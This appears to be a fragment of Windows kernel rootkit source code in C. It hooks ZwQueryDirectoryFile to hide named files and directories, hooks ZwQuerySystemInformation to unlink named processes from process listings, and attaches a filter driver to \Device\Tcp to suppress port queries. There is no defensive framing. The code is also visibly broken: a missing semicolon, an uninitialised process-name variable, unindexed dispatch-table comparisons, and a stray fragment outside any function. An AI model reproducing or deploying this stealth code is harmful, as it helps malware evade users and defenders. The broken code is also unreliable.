typedef struct _FILETIME
{
   DWORD dwLowDateTime;
   DWORD dwHighDateTime;
} FILETIME;

typedef struct _DirEntry
{
   DWORD dwLenToNext;
   DWORD dwAttr;
   FILETIME ftCreate, ftLastAccess, ftLastWrite;
   DWORD dwUnknown[ 2 ];
   DWORD dwFileSizeLow;
   DWORD dwFileSizeHigh;
   DWORD dwUnknown2[ 3 ];
   WORD wNameLen;
   WORD wUnknown;
   DWORD dwUnknown3;
   WORD wShortNameLen;
   WCHAR swShortName[ 12 ];
   WCHAR suName[ 1 ];
} DirEntry, *PDirEntry;

struct _SYSTEM_THREADS
{
   LARGE_INTEGER      KernelTime;
   LARGE_INTEGER      UserTime;
   LARGE_INTEGER      CreateTime;
   ULONG           WaitTime;
   PVOID           StartAddress;
   CLIENT_ID        ClientIs;
   KPRIORITY        Priority;
   KPRIORITY        BasePriority;
   ULONG           ContextSwitchCount;
   ULONG           ThreadState;
   KWAIT_REASON      WaitReason;
};

struct _SYSTEM_PROCESSES
{
   ULONG           NextEntryDelta;
   ULONG           ThreadCount;
   ULONG           Reserved[6];
   LARGE_INTEGER      CreateTime;
   LARGE_INTEGER      UserTime;
   LARGE_INTEGER      KernelTime;
   UNICODE_STRING     ProcessName;
   KPRIORITY        BasePriority;
   ULONG           ProcessId;
   ULONG           InheritedFromProcessId;
   ULONG           HandleCount;
   ULONG           Reserved2[2];
   VM_COUNTERS       VmCounters;
   IO_COUNTERS       IoCounters;
   struct _SYSTEM_THREADS Threads[1];
};


// Hidden Directory / File

NTSTATUS HookZwQueryDirectoryFile(
   IN HANDLE hFile,
   IN HANDLE hEvent OPTIONAL,
   IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
   IN PVOID IoApcContext OPTIONAL,
   OUT PIO_STATUS_BLOCK pIoStatusBlock,
   OUT PVOID FileInformationBuffer,
   IN ULONG FileInformationBufferLength,
   IN FILE_INFORMATION_CLASS FileInfoClass,
   IN BOOLEAN bReturnOnlyOneEntry,
   IN PUNICODE_STRING PathMask OPTIONAL,
   IN BOOLEAN bRestartQuery)
{
   NTSTATUS         rc;
   CHAR            aProcessName[80];   
   ANSI_STRING       ansiFileName,ansiDirName;
   UNICODE_STRING     uniFileName;
   PP_DIR          ptr;

   WCHAR           ParentDirectory[1024] = {0};
   int            BytesReturned;
   PVOID           Object;

      
   // implementation fo the old ZwQueryDirectoryFile function
   rc = ((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile))(
        hFile,                  
        hEvent,
        IoApcRoutine,
        IoApcContext,
        pIoStatusBlock,
        FileInformationBuffer,
        FileInformationBufferLength,
        FileInfoClass,
        bReturnOnlyOneEntry,
        PathMask,
        bRestartQuery);

   if(NT_SUCCESS(rc))
   {
      PDirEntry p;
      PDirEntry pLast;
      BOOL bLastOne;
      int found;      
      p = (PDirEntry)FileInformationBuffer;   //will assign the structure to find out the results of
      pLast = NULL;
      
      do
      {
        bLastOne = !( p->dwLenToNext );
        RtlInitUnicodeString(&uniFileName,p->suName);
        RtlUnicodeStringToAnsiString(&ansiFileName,&uniFileName,TRUE);
        RtlUnicodeStringToAnsiString(&ansiDirName,&uniFileName,TRUE);
        RtlUpperString(&ansiFileName,&ansiDirName);

        found=0;
        
        //find the list contains the current directory
        for(ptr = list_head; ptr != NULL; ptr = ptr->next)
        {
           if (ptr->flag != PTR_HIDEDIR) continue;
           if( RtlCompareMemory( ansiFileName.Buffer, ptr->name,strlen(ptr->name) ) == strlen(ptr->name))
           {
              found=1;
              break;
           }
        }//end for

        //Find the list contains the current directory
        if(found)
        {
           if(bLastOne)
           {
              if(p == (PDirEntry)FileInformationBuffer )
              {
                 rc = 0x80000006;   //Hide
              }
              else
                pLast->dwLenToNext = 0;
              break;
           }
           else
           {
              int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
              int iLeft = (DWORD)FileInformationBufferLength - iPos - p->dwLenToNext;
              RtlCopyMemory( (PVOID)p, (PVOID)( (char *)p + p->dwLenToNext ), (DWORD)iLeft );
              continue;
           }
        }
        pLast = p;
        p = (PDirEntry)((char *)p + p->dwLenToNext );
      }while( !bLastOne );
      RtlFreeAnsiString(&ansiDirName);  
      RtlFreeAnsiString(&ansiFileName);
   }
   return(rc);
}


// Hide the process of

NTSTATUS HookZwQuerySystemInformation(IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength)
{
   NTSTATUS rc;

   ANSI_STRING process_name,process_uname,process_name1,process_name2;
   BOOL   g_hide_proc = TRUE;
   CHAR   aProcessName[80];
   PP_DIR  ptr;        
   int    found;


   // Implemention ZwQuerySystemInformation function
   rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
      SystemInformationClass,
      SystemInformation,
      SystemInformationLength,
      ReturnLength );

   if(NT_SUCCESS(rc ))
   {
      if( g_hide_proc && (5 == SystemInformationClass))
      {
        // Will assign the sturcutre to find out eh
        struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
        struct _SYSTEM_PROCESSES *prev = NULL;

        // traversal process
        while(curr)
        {  
               
           if((0 < process_name.Length) && (255 > process_name.Length))
           {
              found=0;
              // traverse list
              for (ptr=list_head;ptr!=NULL;ptr=ptr->next )
              {  
                if (ptr->flag != PTR_HIDEPROC) continue ;
               
                if (memcmp(process_name.Buffer,ptr->name,strlen(ptr->name)) == 0)
                        {
                            found =1;
                        }
              }
        
              // determine if the process is hidden out of the coverage of this process
              while(found)
              {

                if(prev)
                {
                   if(curr->NextEntryDelta)
                   {
                      prev->NextEntryDelta += curr->NextEntryDelta;
                   }
                   else
                   {
                      prev->NextEntryDelta = 0;
                   }
            }
            else
                {
                   if(curr->NextEntryDelta)
                   {
                      (char *)SystemInformation += curr->NextEntryDelta;
                   }
                   else
                   {
                      SystemInformation = NULL;
                   }
                }
                        
                        if(curr->NextEntryDelta)((char *)curr += curr->NextEntryDelta);
                        else
                        {
                            curr = NULL;break;
                        }
                        // traverse list
                        found = 0;
                        for (ptr=list_head;ptr!=NULL;ptr=ptr->next )
                        {  
                            if (ptr->flag != PTR_HIDEPROC) continue ;
                           
                            if (memcmp(process_name.Buffer,ptr->name,strlen(ptr->name)) == 0)
                            {
                                found = 1;
                            }
                        }
                    }
                }
                if(curr != NULL)
                {
                    prev = curr;
                    if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
                    else curr = NULL;
                }
            }
      }
   }
   return(rc);
}



//hide port

    PDEVICE_OBJECT   m_TcpgetDevice;

    PDEVICE_OBJECT   TcpDevice;
    UNICODE_STRING   TcpDeviceName;
    PDRIVER_OBJECT   TcpDriver;
    PDEVICE_OBJECT   TcpgetDevice;
    PDEVICE_OBJECT   FilterDevice
    PDRIVER_DISPATCH  Empty;
    NTSTATUS       status;

    Empty = DriverObject->MajorFunction[IRP_MJ_CREATE];
   
    RtlInitUnicodeString( &TcpDeviceName, L"\\Device\\Tcp");

    //Get the existing equipment guide

    status = IoGetDeviceObjectPointer( &TcpDeviceName, FILE_ALL_ACCESS, &FileObject, &TcpDevice);


   if(!NT_SUCCESS(status))
    {
      DbgPrint("IoGetDeviceObjectPointer error!\n");
      return status;
    }

   DbgPrint("IoGetDeviceObjectPointer ok!\n");
  
   // setup equipment  
   status = IoCreateDevice( DriverObject,
                    sizeof(DEVICE_EXTENSION),
                    NULL,
                    FILE_DEVICE_UNKNOWN,
                    0,
                    FALSE,
                    &FilterDevice
                  );
   if(!NT_SUCCESS(status))
   {
      return status;
   }

   // adding equipment

   TcpgetDevice = IoAttachDeviceToDeviceStack( FilterDevice, TcpDevice);

   if(!TcpgetDevice)
   {
      IoDeleteDevice(FilterDevice);
     DbgPrint("IoAttachDeviceToDeviceStack error!\n");
      return STATUS_SUCCESS;
   }

   m_TcpgetDevice = TcpgetDevice;
  
  // add filter function to deal with
  for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
  {
     if((TcpDriver->MajorFunction!=Empty)&&(DriverObject->MajorFunction==Empty))
     {
        DriverObject->MajorFunction = PassThrough;
         
     }
  }

  ObDereferenceObject(FileObject);


NTSTATUS PassThrough( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{

     NTSTATUS              status;
     PIO_STACK_LOCATION       pIrpStack;

     pIrpStack = IoGetCurrentIrpStackLocation( Irp );


     //if the completion of inquiry IRP
     if ( pIrpStack->Parameters.DeviceIoControl.IoControlCode == QUERY_INFORMATION_EX)
     {
        //you can further determine if a port

        Irp->IoStatus.Status=STATUS_SUCCESS;
        IoCompleteRequest(Irp,IO_NO_INCREMENT);
        return STATUS_SUCCESS;
     }

    //copy the  IRP
    IoCopyCurrentIrpStackLocationToNext(Irp);
  
    IoSetCompletionRoutine( Irp,
                    GenericCompletion,
                    NULL,
                    TRUE,
                   TRUE,
                   TRUE
                  );

    //Pass
    return IoCallDriver( m_TcpgetDevice, Irp);

}

